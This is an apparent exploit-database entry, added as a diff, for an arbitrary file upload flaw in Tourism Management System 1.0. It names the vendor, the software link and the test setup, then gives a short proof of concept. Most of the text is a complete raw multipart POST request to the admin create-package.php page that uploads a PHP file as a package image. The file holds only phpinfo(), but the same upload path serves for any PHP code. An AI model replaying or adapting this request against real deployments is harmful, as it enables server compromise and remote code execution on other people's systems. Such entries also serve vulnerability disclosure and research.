@@ -1,0 +1,67 @@
+#Exploit Title: Tourism Management System 1.0 - Arbitrary File Upload
+#Date: 2020-10-19
+#Exploit Author: Ankita Pal & Saurav Shukla
+#Vendor Homepage: https://phpgurukul.com/tourism-management-system-free-download/
+#Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=7204
+#Version: V1.0
+#Tested on: Windows 10 + xampp v3.2.4
+
+
+Proof of Concept:::
+
+Step 1: Open the affected URL http://localhost:8081/Tourism%20Management%20System%20-TMS/tms/admin/create-package.php
+
+Step 2: Open Tour Package -> Create
+
+Malicious Request:::
+
+POST /Tourism%20Management%20System%20-TMS/tms/admin/create-package.php HTTP/1.1
+Host: localhost:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------63824304340061635682865592713
+Content-Length: 1101
+Origin: http://localhost:8081
+Connection: close
+Referer: http://localhost:8081/Tourism%20Management%20System%20-TMS/tms/admin/create-package.php
+Cookie: PHPSESSID=q9kusr41d3em013kbe98b701id
+Upgrade-Insecure-Requests: 1
+
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="packagename"
+
+Pack1
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="packagetype"
+
+Family
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="packagelocation"
+
+Manali
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="packageprice"
+
+21
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="packagefeatures"
+
+Free
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="packagedetails"
+
+Details
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="packageimage"; filename="file1.php"
+Content-Type: application/octet-stream
+
+<?php
+	phpinfo();
+?>
+-----------------------------63824304340061635682865592713
+Content-Disposition: form-data; name="submit"
+
+
+-----------------------------63824304340061635682865592713--
